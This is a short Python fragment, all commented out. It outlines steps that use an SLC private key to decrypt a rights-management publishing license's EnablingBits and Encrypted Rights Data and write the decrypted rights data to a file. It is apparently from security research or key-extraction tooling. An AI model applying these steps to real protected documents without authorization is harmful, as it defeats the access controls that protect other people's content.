# Commented from Jann --> even in the videos this failes every time
#    print("\n\n#################################################")
#   print("Parsing SLC private key")
#    print("#################################################")
#    ret, slc_priv_key = parse_slc_csp_private_key(slc_path)
#    if ret:
#        print("Done Parsing")

    # success, pl_enablingbits = read_in_hex_file(pl_ena_path, 16)
    # if success == False:
    #     print("Error: Could not read in PL")
    #     exit(1)
    # else:
    #     print("\n\n#################################################")
    #     print("Parsing and decrypting PL EnablingBits Element")
    #     print("#################################################")

    # authorization_key = decrypt_and_parse_enabling_bits(
    #     pl_enablingbits, slc_priv_key, True, 2048, pkcs1v15
    # )

    # success, pl_erd = read_in_hex_file(pl_erd_path, 16)
    # if success == False:
    #     print("Error: Could not read in PL Encrypted-Rights-Data")
    #     exit(1)
    # else:
    #     print("\n\n#################################################")
    #     print("Parsing and decrypting PL Encrypted Rights Data ")
    #     print("#################################################")
    # erd = decrypt_aes_bytes_to_file(
    #     authorization_key, pl_erd, out_filename="output/erd.dec", chunksize=16, size=0
    # )
    # print("Written Encrypted-Rights-Data to output/erd.dec")
